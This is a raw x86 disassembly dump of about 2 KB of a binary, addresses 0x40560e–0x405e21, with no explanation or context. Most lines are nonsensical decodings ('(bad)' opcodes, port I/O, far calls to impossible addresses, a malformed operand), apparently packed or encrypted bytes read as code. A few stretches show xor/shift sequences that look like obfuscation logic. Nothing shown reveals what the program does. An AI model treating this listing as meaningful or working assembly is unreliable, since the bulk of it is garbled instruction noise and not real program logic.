  40560e:	ins    DWORD PTR es:[edi],dx
  40560f:	(bad)  
  405611:	sahf   
  405612:	ror    DWORD PTR [esi-0x68550e53],cl
  405618:	xor    esp,esi
  40561a:	popa   
  40561b:	call   0x6787:0x3e05a3e9
  405622:	jle    0x405617
  405624:	fisttp WORD PTR [ebx+eiz*4-0x6b8393f8]
  40562b:	arpl   WORD PTR [edx-0xce54d19],bp
  405631:	in     eax,dx
  405632:	adc    eax,0x2e138533
  405637:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405638:	sub    al,0xa4
  40563a:	out    dx,al
  40563b:	add    BYTE PTR [edx+0x70d3c711],al
  405641:	es or  edi,eax
  405644:	aam    0x78
  405646:	cwde   
  405647:	pop    ebx
  405648:	mov    ds:0x7f879827,eax
  40564d:	or     BYTE PTR [edi-0x28],dh
  405650:	adc    edi,DWORD PTR [edi]
  405652:	inc    esp
  405653:	mov    ah,0x95
  405655:	hlt    
  405656:	lahf   
  405657:	fadd   st,st(7)
  405659:	call   0xbc38cfa9
  40565e:	or     eax,0x8966b04a
  405663:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405664:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405665:	rcl    BYTE PTR [ebp+0x12],cl
  405668:	add    ebp,ebp
  40566a:	in     al,0x82
  40566c:	test   eax,0x94052aae
  405671:	jmp    0xd759:0x7ccd97b3
  405678:	bound  edx,QWORD PTR [edx-0x7d]
  40567b:	jge    0x405613
  40567d:	fsub   DWORD PTR [ecx-0x68a4b720]
  405683:	repz inc esp
  405685:	xor    edx,esp
  405687:	mov    al,0xe
  405689:	pop    esp
  40568a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40568b:	aaa    
  40568c:	imul   ebx,DWORD PTR [edi],0x7b9906cf
  405692:	pop    ebx
  405693:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405694:	inc    edi
  405695:	push   ebx
  405696:	jmp    0x405669
  405698:	fwait
  405699:	sub    ebx,DWORD PTR [bp+di+0x4d7f]
  40569e:	or     eax,0xc2b6c48f
  4056a3:	sbb    eax,edi
  4056a5:	adc    eax,0xb3df40e2
  4056aa:	not    BYTE PTR [esi+0x46]
  4056ad:	inc    esi
  4056ae:	repz cmp BYTE PTR [esi+0x5720156f],cl
  4056b5:	mov    al,0xbe
  4056b7:	pop    ebx
  4056b8:	inc    edi
  4056b9:	addr16 data16 jge 0x40563f
  4056bd:	mov    ah,0xe8
  4056bf:	adc    BYTE PTR [esp],al
  4056c2:	hlt    
  4056c3:	mov    al,0x3
  4056c5:	dec    eax
  4056c6:	aam    0x1d
  4056c8:	and    esi,eax
  4056ca:	shl    BYTE PTR [edx+esi*4],0x93
  4056ce:	or     DWORD PTR [edx+0x5f],eax
  4056d1:	pop    esi
  4056d2:	out    0xdd,al
  4056d4:	jmp    0x4056b5
  4056d6:	fcmove st,st(7)
  4056d8:	mov    ebp,0x4965608f
  4056dd:	fistp  DWORD PTR [esi]
  4056df:	daa    
  4056e0:	dec    edi
  4056e1:	jmp    0xf23432d4
  4056e6:	addr16 cs jge 0x4056b3
  4056ea:	pop    ebp
  4056eb:	pop    ebx
  4056ec:	out    dx,al
  4056ed:	sbb    BYTE PTR [ebp-0x7db5fb68],bl
  4056f3:	inc    esp
  4056f4:	cmp    BYTE PTR ds:0xd0555f9a,0x8e
  4056fb:	mov    DWORD PTR [ecx],ecx
  4056fd:	jae    0x4056b9
  4056ff:	daa    
  405700:	in     al,0x6f
  405702:	dec    edi
  405703:	sub    BYTE PTR [edi+0x63],ch
  405706:	sbb    BYTE PTR [ecx-0x74],al
  405709:	test   DWORD PTR gs:[ecx],esi
  40570c:	subps  xmm1,xmm5
  40570f:	xchg   esp,eax
  405710:	adc    ah,ah
  405712:	add    eax,0x3725a36f
  405717:	xchg   edi,eax
  405718:	out    dx,al
  405719:	jmp    0xc445a57f
  40571e:	cmp    eax,0x8a7f847
  405723:	ins    BYTE PTR es:[edi],dx
  405724:	push   ebp
  405725:	jl     0x405745
  405727:	pop    ds
  405728:	imul   ecx,DWORD PTR [ecx-0x2c0c40cf],0x2b92502b
  405732:	mov    ds:0xfa6602c8,al
  405737:	mov    esp,0xdf052712
  40573c:	mov    ch,BYTE PTR [edi+0x7f]
  40573f:	jecxz  0x405771
  405741:	or     BYTE PTR [eax],cl
  405743:	addr16 icebp 
  405745:	popa   
  405746:	and    DWORD PTR ds:0x37421654,ecx
  40574c:	sbb    ecx,edi
  40574e:	sub    dl,dh
  405750:	out    dx,al
  405751:	shl    DWORD PTR gs:0xcf984c6e,0xac
  405759:	mov    esi,0xac95ea3e
  40575e:	popa   
  40575f:	add    BYTE PTR [ecx+edi*4],ah
  405762:	pop    ebx
  405763:	std    
  405764:	or     al,0x6c
  405766:	aaa    
  405767:	call   0x7a36:0xf9897a01
  40576e:	aas    
  40576f:	ins    DWORD PTR es:[edi],dx
  405770:	icebp  
  405771:	add    bh,BYTE PTR [edi-0x48]
  405774:	add    eax,0xccf6bfb0
  405779:	in     eax,dx
  40577a:	adc    BYTE PTR [ebp+eax*1-0x40],0xf3
  40577f:	and    ebx,esp
  405781:	push   0xffffffbc
  405783:	push   esi
  405784:	sbb    eax,0x7b0404c9
  405789:	jp     0x40571c
  40578b:	es out dx,al
  40578d:	or     DWORD PTR [edi],esi
  40578f:	aas    
  405790:	pop    eax
  405791:	mov    ah,0x9d
  405793:	dec    eax
  405794:	fld    TBYTE PTR [edx]
  405796:	rcr    BYTE PTR [edx-0x45],0x74
  40579a:	or     DWORD PTR [eax],edi
  40579c:	retf   
  40579d:	and    eax,0x6952cc56
  4057a2:	ficomp DWORD PTR [esp+edx*8]
  4057a5:	dec    ebx
  4057a6:	lods   al,BYTE PTR ds:[esi]
  4057a7:	mov    bh,0x4d
  4057a9:	pop    ds
  4057aa:	dec    edx
  4057ab:	mov    dl,0xe4
  4057ae:	mov    al,0x4d
  4057b0:	sbb    eax,0x526cc3d
  4057b5:	mov    edx,0xbb7f3871
  4057ba:	pop    ebx
  4057bb:	rol    DWORD PTR [esi-0x7c2d8feb],cl
  4057c1:	call   0xa1994f00
  4057c6:	and    eax,0xffbdf282
  4057cb:	cld    
  4057cc:	mov    ds:0x8e6ac0f7,al
  4057d1:	jge    0x405827
  4057d3:	sti    
  4057d4:	mov    dh,0xea
  4057d6:	in     al,dx
  4057d7:	aas    
  4057d8:	pop    eax
  4057d9:	inc    esp
  4057da:	add    al,0x9c
  4057dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4057dd:	push   ebp
  4057de:	add    al,0xa1
  4057e0:	cld    
  4057e1:	dec    ebp
  4057e2:	push   esp
  4057e3:	pop    ebx
  4057e4:	mov    ch,0xf1
  4057e6:	pop    ecx
  4057e7:	jle    0x4057fb
  4057e9:	xchg   esi,eax
  4057ea:	and    BYTE PTR [eax+ecx*2-0x2bb12685],0x88
  4057f2:	and    bl,ch
  4057f4:	push   edx
  4057f5:	xchg   ecx,eax
  4057f6:	jl     0x405809
  4057f8:	retf   0xf357
  4057fb:	por    mm1,QWORD PTR [ebx-0x19f7896d]
  405802:	neg    DWORD PTR [eax-0x27]
  405805:	adc    al,BYTE PTR [ebx]
  405807:	add    BYTE PTR [esi+0x7885d78],dl
  40580d:	cs jbe 0x4057f0
  405810:	push   es
  405811:	in     ax,0x11
  405814:	rol    DWORD PTR gs:0xd1d25ef1,cl
  40581b:	push   ebx
  40581c:	cdq    
  40581d:	lds    eax,FWORD PTR [eax-0x60e5e4ef]
  405823:	aas    
  405824:	aam    0xe1
  405826:	push   edi
  405827:	scas   eax,DWORD PTR es:[edi]
  405828:	xchg   edx,eax
  405829:	js     0x40583d
  40582b:	add    eax,esp
  40582d:	ret    0xed27
  405830:	lods   al,BYTE PTR ds:[esi]
  405831:	sbb    ebx,ebx
  405833:	test   al,0xb2
  405835:	adc    eax,0x2b0a218f
  40583a:	mov    edx,DWORD PTR [esi+0x4]
  40583d:	neg    DWORD PTR ds:0x42838b
  405843:	mov    DWORD PTR [ebp-0x2c],ecx
  405846:	cmp    DWORD PTR ds:0x428177,0x0
  40584d:	mov    DWORD PTR ds:0x428267,0x540
  405857:	mov    ecx,0x427
  40585c:	mov    edx,0x7aa7
  405861:	jmp    0x4058af
  405866:	mov    ecx,0x6abc
  40586b:	mov    DWORD PTR ds:0x428267,0x2ac5
  405875:	cmp    DWORD PTR ds:0x428177,0x0
  40587c:	jb     0x40589d
  405882:	push   0x1050
  405887:	call   DWORD PTR ds:0x428e74
  40588d:	adc    DWORD PTR ds:0x42830b,edx
  405893:	or     DWORD PTR ds:0x42823b,0x369f
  40589d:	neg    DWORD PTR ds:0x42817b
  4058a3:	sub    DWORD PTR ds:0x42815b,edi
  4058a9:	sub    edx,0xfd0
  4058af:	mov    ecx,DWORD PTR [ebp+0x18]
  4058b2:	mov    edx,DWORD PTR [ebp+0x1c]
  4058b5:	shrd   ecx,edx,0x2
  4058b9:	shr    edx,0x2
  4058bc:	mov    DWORD PTR [ebp-0x1c],ecx
  4058bf:	mov    ecx,DWORD PTR [ebp+0x18]
  4058c2:	mov    edx,DWORD PTR [ebp+0x1c]
  4058c5:	xor    DWORD PTR [ebp-0x1c],edi
  4058c8:	xor    edx,edx
  4058ca:	or     edx,DWORD PTR [ebp-0x1c]
  4058cd:	shl    ecx,0x1e
  4058d0:	add    edx,DWORD PTR [ebp-0x2c]
  4058d3:	add    DWORD PTR [eax],edx
  4058d5:	mov    eax,DWORD PTR [esi]
  4058d7:	mov    ecx,DWORD PTR [esi+0x4]
  4058da:	shrd   eax,ecx,0x2
  4058de:	shr    ecx,0x2
  4058e1:	mov    ecx,DWORD PTR [esi]
  4058e3:	mov    edx,DWORD PTR [esi+0x4]
  4058e6:	xor    eax,edi
  4058e8:	shl    ecx,0x1e
  4058eb:	xor    edx,edx
  4058ed:	or     edx,eax
  4058ef:	mov    DWORD PTR [ebp-0x4],edx
  4058f2:	mov    DWORD PTR [ebp-0x30],0xca79a575
  4058f9:	mov    eax,0x9c1b89e8
  4058fe:	jmp    0x405cdc
  405903:	ret    
  405904:	scas   eax,DWORD PTR es:[edi]
  405905:	sar    ebx,0x9d
  405908:	fcmovb st,st(2)
  40590a:	scas   al,BYTE PTR es:[edi]
  40590b:	mov    dl,0xbd
  40590d:	(bad)  
  40590e:	jl     0x405907
  405910:	xchg   ebx,esp
  405912:	stos   BYTE PTR es:[edi],al
  405913:	ins    DWORD PTR es:[edi],dx
  405914:	mov    cl,0x18
  405916:	sbb    BYTE PTR [esi+0x48181812],bl
  40591c:	test   al,0x43
  40591e:	sub    edi,esi
  405920:	test   BYTE PTR [edx],dl
  405922:	jge    0x405922
  405924:	push   0x6d
  405926:	jg     0x4058dc
  405928:	pop    edi
  405929:	ret    
  40592a:	fcom   QWORD PTR [ecx]
  40592c:	cmp    BYTE PTR [ebx+0x3],0xed
  405930:	add    DWORD PTR [eax],0x56
  405933:	retf   0xfa92
  405936:	out    0x29,eax
  405938:	xor    DWORD PTR [edi],ecx
  40593a:	mov    ah,0x13
  40593c:	js     0x405959
  40593e:	sbb    bh,dl
  405940:	add    eax,0x1b7a96de
  405945:	stc    
  405946:	cmp    eax,0x6dd2c111
  40594b:	repz std 
  40594d:	mov    bl,0xe6
  40594f:	jne    0x4059b7
  405951:	ror    DWORD PTR [ebx+0x63],cl
  405954:	xor    BYTE PTR [esi+eiz*8],bl
  405957:	xchg   ebp,eax
  405958:	leave  
  405959:	cmp    DWORD PTR [ecx+0x238a8a25],ebp
  40595f:	ins    DWORD PTR es:[edi],dx
  405960:	retf   0x7c8a
  405963:	adc    ebx,DWORD PTR [ebx-0x2d]
  405966:	dec    ebx
  405967:	cli    
  405968:	or     BYTE PTR [eax+0x9],bh
  40596b:	(bad)  [eax+0x45b8f682]
  405971:	imul   ecx,DWORD PTR [edi],0x7989ab86
  405977:	and    bh,BYTE PTR [ebx+0x7b]
  40597a:	sti    
  40597b:	loope  0x40591e
  40597d:	sbb    ah,ah
  40597f:	idiv   BYTE PTR [esi+0x59b30d6d]
  405985:	push   0x32
  405987:	rol    DWORD PTR [ecx+0x6b],cl
  40598a:	or     eax,0xf002c55
  40598f:	dec    edi
  405990:	sbb    al,0x7b
  405992:	dec    eax
  405993:	push   esi
  405994:	inc    ebp
  405995:	pop    ebp
  405996:	test   bh,cl
  405998:	or     DWORD PTR [ecx+eax*4-0x38],edi
  40599c:	push   es
  40599d:	imul   edx,DWORD PTR [esp+ebx*2],0x73f527
  4059a4:	push   edi
  4059a5:	fsub   QWORD PTR [esi+0x27]
  4059a8:	or     eax,0x1e32079c
  4059ad:	pop    es
  4059ae:	in     al,dx
  4059af:	inc    eax
  4059b0:	xchg   esi,eax
  4059b1:	sbb    al,0x96
  4059b3:	test   BYTE PTR [eax],0x11
  4059b6:	loop   0x4059b6
  4059b8:	pop    edi
  4059b9:	shr    DWORD PTR [eax],1
  4059bb:	cld    
  4059bc:	ja     0x405994
  4059be:	jbe    0x4059b8
  4059c0:	inc    esi
  4059c1:	sbb    DWORD PTR [edx+0x74],edx
  4059c4:	hlt    
  4059c5:	and    BYTE PTR [ebx+0x78],bl
  4059c8:	in     al,dx
  4059c9:	in     al,dx
  4059ca:	dec    edi
  4059cb:	pop    eax
  4059cc:	pop    esi
  4059cd:	cmp    al,0x69
  4059cf:	cmp    eax,0x48113ac9
  4059d4:	push   edx
  4059d5:	mov    eax,0x7ee46d24
  4059da:	mov    ?,WORD PTR [edi+0x4e]
  4059dd:	or     bl,BYTE PTR [ecx+0x41]
  4059e0:	mov    ch,0x3b
  4059e2:	jecxz  0x405a5a
  4059e4:	inc    eax
  4059e5:	add    DWORD PTR [edx-0x7],0x47416d15
  4059ec:	sbb    bl,bl
  4059ee:	dec    ecx
  4059ef:	xchg   esp,eax
  4059f0:	lea    edi,[edx-0x5c]
  4059f3:	outs   dx,BYTE PTR ds:[esi]
  4059f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4059f5:	fsubp  st(4),st
  4059f7:	xor    DWORD PTR [eax-0x396ee892],edi
  4059fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4059fe:	test   dl,ah
  405a00:	mov    DWORD PTR [ecx+ebx*8-0x54],ebp
  405a04:	xor    ah,BYTE PTR [edi-0x41c08b58]
  405a0a:	add    edx,edx
  405a0c:	sbb    DWORD PTR [ebx+edi*8+0x11c3707e],edx
  405a13:	push   es
  405a14:	sub    DWORD PTR [edi+0x31],ebp
  405a17:	cmp    DWORD PTR [eax+0x6643b8a7],esi
  405a1d:	mov    fs,WORD PTR [ebx]
  405a1f:	aad    0xa1
  405a21:	xchg   DWORD PTR ds:0xed92f5bc,ebx
  405a27:	cmp    BYTE PTR [ebx+0x30],ah
  405a2a:	mov    ds:0x57c44f8e,eax
  405a2f:	adc    esi,DWORD PTR [ebp-0x70]
  405a32:	shl    BYTE PTR [eax+0x272d1ba4],1
  405a38:	ins    BYTE PTR es:[edi],dx
  405a39:	mov    esi,0x6df612a
  405a3e:	mov    ebx,0xe2a0511e
  405a43:	dec    eax
  405a44:	fadd   DWORD PTR [edi+0x634175c1]
  405a4a:	mov    al,0x92
  405a4c:	mov    bh,0x63
  405a4e:	fsubr  DWORD PTR [ebp-0x549ddda9]
  405a54:	xchg   ebp,eax
  405a55:	push   cs
  405a56:	in     al,dx
  405a57:	cmp    DWORD PTR [ecx-0x3f1115b6],0x1
  405a5e:	frstor [eax-0x21bd5ed4]
  405a64:	add    ebp,DWORD PTR [esi-0x1d243013]
  405a6a:	popa   
  405a6b:	dec    ecx
  405a6c:	call   0x44424b4e
  405a71:	dec    ecx
  405a72:	or     edx,DWORD PTR [ecx-0x6b]
  405a75:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405a76:	pop    ds
  405a77:	push   es
  405a78:	pop    ds
  405a79:	push   eax
  405a7a:	ins    BYTE PTR es:[edi],dx
  405a7b:	dec    ebx
  405a7c:	dec    ebp
  405a7d:	hlt    
  405a7e:	cmp    ebx,0x7e974413
  405a84:	add    eax,eax
  405a86:	jb     0x405a81
  405a88:	mov    edi,0x690c2471
  405a8d:	sub    BYTE PTR [eax+0x35],dh
  405a90:	xor    al,0xe8
  405a92:	cmp    ecx,ebx
  405a94:	les    esp,FWORD PTR [ebx+0x8]
  405a97:	jno    0x405afa
  405a99:	in     eax,dx
  405a9a:	iret   
  405a9b:	enter  0xcdd1,0x22
  405a9f:	stos   DWORD PTR es:[edi],eax
  405aa0:	test   DWORD PTR [edx+0x3967a880],ecx
  405aa6:	jno    0x405a35
  405aa8:	push   0x822cc40
  405aad:	out    0x54,eax
  405aaf:	pop    esp
  405ab0:	mov    dl,0xa1
  405ab2:	mov    eax,ds:0x444a14b2
  405ab7:	push   ebx
  405ab8:	xchg   BYTE PTR [ebp-0x750ef860],ah
  405abe:	test   al,0x16
  405ac0:	jmp    0x405ab5
  405ac2:	in     eax,0xc1
  405ac4:	adc    dh,dh
  405ac6:	or     edi,ebp
  405ac8:	int    0x86
  405aca:	sub    ecx,0xffffffd7
  405acd:	bswap  eax
  405acf:	mov    bh,0x1
  405ad1:	(bad)  
  405ad2:	sti    
  405ad3:	xchg   cl,al
  405ad5:	ja     0x405b50
  405ad7:	mov    ebp,0x7ddcb2d5
  405adc:	push   es
  405add:	add    ebp,DWORD PTR [edx+0x6c]
  405ae0:	adc    esp,ebx
  405ae2:	xchg   esi,eax
  405ae3:	popa   
  405ae4:	aaa    
  405ae5:	cs addr16 pop eax
  405ae8:	sbb    ecx,DWORD PTR [edx+ebp*4+0x7a93bec7]
  405aef:	adc    ch,dh
  405af1:	inc    eax
  405af2:	arpl   WORD PTR [ebx+0x4f],sp
  405af5:	out    0x0,al
  405af7:	shr    BYTE PTR [ebx],1
  405af9:	mov    edx,esi
  405afb:	dec    edx
  405afc:	rcl    BYTE PTR [ebp+0x50],cl
  405aff:	neg    bl
  405b01:	jb     0x405ac1
  405b03:	mov    edx,0xa5691b80
  405b08:	mov    ds:0x6b1ebc37,al
  405b0d:	cmp    ch,BYTE PTR [ecx+eiz*1+0x46860cca]
  405b14:	sbb    cl,dl
  405b16:	std    
  405b17:	gs or  eax,0x74f93772
  405b1d:	icebp  
  405b1e:	aam    0xc6
  405b20:	jbe    0x405b50
  405b22:	xor    eax,0xf18437e9
  405b27:	std    
  405b28:	cli    
  405b29:	in     eax,0xd7
  405b2b:	sbb    BYTE PTR [edi],bl
  405b2d:	xchg   ebx,eax
  405b2e:	enter  0xee3a,0xf6
  405b32:	ins    DWORD PTR es:[edi],dx
  405b33:	mov    ecx,0x40a007fb
  405b38:	sahf   
  405b39:	(bad)  
  405b3a:	imul   DWORD PTR [ecx+0x2b]
  405b3d:	and    DWORD PTR [ebx],esp
  405b3f:	clc    
  405b40:	or     bh,BYTE PTR [ecx-0x4727d466]
  405b46:	fwait
  405b47:	jp     0x405b4c
  405b49:	sbb    eax,0xbcd1e750
  405b4e:	xor    edi,DWORD PTR [esi+edx*1+0x1c]
  405b52:	mov    edi,0xaf5a0aff
  405b57:	scas   eax,DWORD PTR es:[edi]
  405b58:	xchg   ecx,eax
  405b59:	jmp    0xf4419211
  405b5e:	fdivr  QWORD PTR [ebp-0x64]
  405b61:	cdq    
  405b62:	push   esp
  405b63:	jmp    0x709f966
  405b68:	jb     0x405b14
  405b6a:	cli    
  405b6b:	jmp    0x76bb0728
  405b70:	and    DWORD PTR [ebp-0x66],ebx
  405b73:	je     0x405b69
  405b75:	and    edi,edi
  405b77:	mov    bh,BYTE PTR ss:[ebp-0x4fdfbee7]
  405b7e:	(bad)  
  405b7f:	popf   
  405b80:	push   ss
  405b81:	ret    0xb22c
  405b84:	ss ret 0x13c3
  405b88:	sbb    al,0x1d
  405b8a:	mov    eax,0x194d806c
  405b8f:	jbe    0x405ba2
  405b91:	adc    al,0xbb
  405b93:	adc    al,0x4a
  405b95:	jg     0x405b94
  405b97:	ret    0x8181
  405b9a:	adc    al,dl
  405b9c:	pextrw ecx,(bad),0xc5
  405b9e:	dec    esi
  405b9f:	cld    
  405ba0:	frstor [eax-0xdbc2bb8]
  405ba6:	shl    DWORD PTR [eax+0x7d],cl
  405ba9:	xchg   ebp,eax
  405baa:	xor    DWORD PTR [ebx+0x6c],edi
  405bad:	in     al,dx
  405bae:	dec    edi
  405baf:	inc    edx
  405bb0:	ret    
  405bb1:	rcr    esi,0xb
  405bb4:	push   edx
  405bb6:	fnstsw WORD PTR [eax]
  405bb8:	shl    DWORD PTR [eax],cl
  405bba:	loopne 0x405bcd
  405bbc:	push   eax
  405bbd:	jne    0x405bb5
  405bbf:	or     ebx,edi
  405bc1:	sbb    eax,0x37685486
  405bc6:	xchg   BYTE PTR [ecx],ch
  405bc8:	mov    ecx,0x76ea7cbe
  405bcd:	sub    DWORD PTR [ecx-0x56],0xffffffcc
  405bd1:	sbb    ecx,DWORD PTR [esi-0x15]
  405bd4:	fstp   TBYTE PTR [ebx+0x3a744b2f]
  405bda:	inc    ebp
  405bdb:	and    eax,eax
  405bdd:	fiadd  DWORD PTR [eax-0x31]
  405be0:	xlat   BYTE PTR ds:[ebx]
  405be1:	daa    
  405be2:	jle    0x405ba5
  405be4:	mov    ds:0xfc5049fd,al
  405be9:	mov    bh,0x90
  405beb:	xchg   ecx,eax
  405bec:	cmp    bh,dl
  405bee:	push   ebx
  405bef:	add    eax,0x3d325fa6
  405bf4:	ror    DWORD PTR [ebx],0x36
  405bf7:	fmul   QWORD PTR [ecx-0x44fd72f3]
  405bfd:	sar    DWORD PTR [esi-0x1d],1
  405c00:	sbb    al,0x9b
  405c02:	jl     0x405bbc
  405c04:	fidivr DWORD PTR [ebx-0x59]
  405c07:	mov    BYTE PTR [ebx+esi*1-0x24],dl
  405c0b:	pop    ecx
  405c0c:	arpl   bx,dx
  405c0e:	cmp    BYTE PTR [edx+0x4856c995],ah
  405c14:	fild   DWORD PTR [ebx+0x62]
  405c17:	add    al,0x87
  405c19:	stos   BYTE PTR es:[edi],al
  405c1a:	nop
  405c1b:	call   0xc1f2d53c
  405c20:	jg     0x405bc0
  405c22:	sbb    ecx,ecx
  405c24:	std    
  405c25:	in     eax,dx
  405c26:	jns    0x405ca1
  405c28:	sub    ah,BYTE PTR [ebp+0x59]
  405c2b:	xlat   BYTE PTR ds:[ebx]
  405c2c:	or     al,0x1
  405c2e:	inc    ebp
  405c2f:	adc    ch,ch
  405c31:	addr16 jo 0x405ca3
  405c34:	xor    eax,0xc41c5101
  405c39:	scas   al,BYTE PTR es:[edi]
  405c3a:	xor    BYTE PTR [edi],ah
  405c3c:	pushf  
  405c3d:	ja     0x405ca4
  405c3f:	xlat   BYTE PTR ds:[ebx]
  405c40:	cld    
  405c41:	jae    0x405bc4
  405c43:	xor    eax,0x5da2c102
  405c48:	sbb    DWORD PTR [eax+0x41ae1394],esp
  405c4e:	jne    0x405cc8
  405c50:	sbb    DWORD PTR [edx+0x4b],ecx
  405c53:	hlt    
  405c54:	ins    BYTE PTR es:[edi],dx
  405c55:	add    BYTE PTR [ebx-0x14],0x96
  405c59:	xor    dh,BYTE PTR [edx-0x5a]
  405c5c:	xor    eax,0x82c51bfe
  405c61:	mov    edi,0x30ad2e92
  405c66:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405c67:	mov    ds:0x90933f85,eax
  405c6c:	xor    BYTE PTR [esi],0xa9
  405c6f:	std    
  405c70:	sbb    al,0xd8
  405c72:	gs and edx,ecx
  405c75:	jbe    0x405c4b
  405c77:	jns    0x405c9f
  405c79:	dec    edi
  405c7a:	push   ebp
  405c7b:	mov    ds:0x288b914,eax
  405c80:	inc    edx
  405c81:	inc    esi
  405c82:	dec    ebp
  405c83:	cdq    
  405c84:	mov    al,0x8d
  405c86:	xchg   edx,eax
  405c87:	pop    es
  405c88:	push   ebx
  405c89:	inc    eax
  405c8a:	pop    di
  405c8c:	sbb    ch,dl
  405c8e:	mov    esp,0xab49c80b
  405c93:	push   0x2f
  405c95:	xor    BYTE PTR [ebp+0x1c],0xee
  405c99:	add    BYTE PTR [eax-0x76],0xed
  405c9d:	pop    edx
  405c9e:	add    BYTE PTR [ebp-0x51],bh
  405ca1:	mov    al,ds:0x9253593c
  405ca6:	dec    ebp
  405ca7:	aad    0xc2
  405ca9:	arpl   WORD PTR [ebx+0x1d],cx
  405cac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405cad:	neg    DWORD PTR [ecx+0x47fe1e3d]
  405cb3:	add    DWORD PTR gs:[ebx-0x2bd4896f],ecx
  405cba:	inc    esp
  405cbb:	lods   al,BYTE PTR ds:[esi]
  405cbc:	sar    ecx,cl
  405cbe:	int    0x6c
  405cc0:	xlat   BYTE PTR ds:[ebx]
  405cc1:	(bad)  
  405cc2:	jg     0x405d16
  405cc4:	or     BYTE PTR [esp+edx*2+0x27b6fe0],dh
  405ccb:	les    ebp,FWORD PTR [ecx+0x5cfa6558]
  405cd1:	shr    BYTE PTR [ecx+esi*4],cl
  405cd4:	retf   
  405cd5:	sub    DWORD PTR [eax],ebx
  405cd7:	in     al,0x81
  405cd9:	stos   DWORD PTR es:[edi],eax
  405cda:	adc    eax,edx
  405cdc:	mov    DWORD PTR [ebp-0x2c],eax
  405cdf:	mov    DWORD PTR [ebp-0x20],0xca79a571
  405ce6:	mov    DWORD PTR [ebp-0x1c],eax
  405ce9:	mov    DWORD PTR [ebp-0x10],0xca79a57d
  405cf0:	mov    DWORD PTR [ebp-0xc],eax
  405cf3:	mov    DWORD PTR [ebp-0x60],0xca79a579
  405cfa:	mov    DWORD PTR [ebp-0x5c],eax
  405cfd:	mov    eax,DWORD PTR [ebp-0x30]
  405d00:	mov    ecx,DWORD PTR [ebp-0x2c]
  405d03:	shrd   eax,ecx,0x2
  405d07:	shr    ecx,0x2
  405d0a:	mov    ecx,DWORD PTR [ebp-0x30]
  405d0d:	mov    edx,DWORD PTR [ebp-0x2c]
  405d10:	xor    eax,edi
  405d12:	shl    ecx,0x1e
  405d15:	xor    edx,edx
  405d17:	or     eax,edx
  405d19:	jmp    0x4060f7
  405d1e:	cmp    ebp,DWORD PTR [ecx+0x3e]
  405d21:	lock sbb ch,BYTE PTR [esi+0x62d8231a]
  405d28:	shl    DWORD PTR [eax+0x4e],1
  405d2b:	cmp    ch,BYTE PTR [ebx-0x50]
  405d2e:	repnz test eax,0x129e1818
  405d34:	sbb    BYTE PTR [eax],bl
  405d36:	test   eax,0xc92f67d7
  405d3b:	mov    edx,0x7acce24a
  405d40:	mov    esp,0x762ec55a
  405d45:	mov    ds:0xe6553c5b,al
  405d4a:	shl    bl,1
  405d4c:	cmp    ebp,edi
  405d4e:	add    ebp,edx
  405d50:	das    
  405d51:	inc    esp
  405d52:	xchg   DWORD PTR [edx-0x32749a66],ecx
  405d58:	mov    esp,0xd61760d5
  405d5d:	pop    ebx
  405d5e:	xchg   esi,eax
  405d5f:	adc    esi,DWORD PTR [esi-0x347f06ae]
  405d65:	and    eax,0x535013ad
  405d6a:	push   ss
  405d6b:	and    bl,al
  405d6d:	add    BYTE PTR [edx],ch
  405d6f:	retf   
  405d70:	jecxz  0x405d46
  405d72:	fisub  WORD PTR [ebx+0x1b]
  405d75:	jge    0x405d7c
  405d77:	xchg   ebx,eax
  405d78:	pop    esi
  405d79:	sar    cl,cl
  405d7b:	push   eax
  405d7c:	jne    0x405dd1
  405d7e:	xor    BYTE PTR [edi],cl
  405d80:	mov    ebx,0xccf241c8
  405d85:	bound  ebx,QWORD PTR [edx]
  405d87:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405d88:	retf   0xda0e
  405d8b:	gs inc esi
  405d8d:	pop    ebp
  405d8e:	cmc    
  405d8f:	imul   ebx,edi,0x5a
  405d92:	cmp    al,ah
  405d94:	loop   0x405d3f
  405d96:	adc    cl,al
  405d98:	ret    0x8f15
  405d9b:	mov    ecx,0xe37cba72
  405da0:	push   ebx
  405da1:	pop    ebx
  405da2:	icebp  
  405da3:	arpl   WORD PTR [esi-0x3c],bx
  405da6:	inc    esp
  405da7:	mov    ah,0x4a
  405da9:	in     eax,0xd6
  405dab:	and    DWORD PTR [ebx+0x595d9128],0x4a8cc856
  405db5:	dec    ebp
  405db6:	(bad)  
  405db7:	xchg   ecx,eax
  405db8:	in     eax,dx
  405db9:	push   edi
  405dba:	or     DWORD PTR [edi+0x335fe7c],esp
  405dc0:	js     0x405dc3
  405dc2:	(bad)  
  405dc3:	push   ecx
  405dc4:	clc    
  405dc5:	dec    eax
  405dc6:	add    DWORD PTR [ebx],edi
  405dc8:	retf   0x4d8c
  405dcb:	mov    ds:0x4bbca9ab,eax
  405dd0:	xchg   DWORD PTR [esi],ebx
  405dd2:	imul   esi,DWORD PTR [edi],0x64f0ce00
  405dd8:	cmp    esi,eax
  405dda:	mov    ebp,0x41cff6b5
  405ddf:	push   ebx
  405de0:	sbb    eax,0xf2cbcc7b
  405de5:	xchg   ecx,eax
  405de6:	add    ch,al
  405de8:	arpl   WORD PTR [eax+edx*2-0x7c],ax
  405dec:	xor    BYTE PTR [edx-0x347a236a],bh
  405df2:	mov    BYTE PTR [ecx+edi*8-0x69],al
  405df6:	jo     0x405de1
  405df8:	idiv   DWORD PTR [eax+ebx*1+0x55ddb265]
  405dff:	jmp    0x459b12b3
  405e04:	ret    0x500
  405e07:	test   al,0x96
  405e09:	adc    BYTE PTR [eax+edi*1+0x649670fd],ah
  405e10:	sahf   
  405e11:	mov    BYTE PTR [edi+esi*4+0x1cf62819],bl
  405e18:	psubd  mm1,QWORD PTR [eax+0x14fb8ac]
  405e1f:	or     dl,bl
  405e21:	mov    cl,0x37
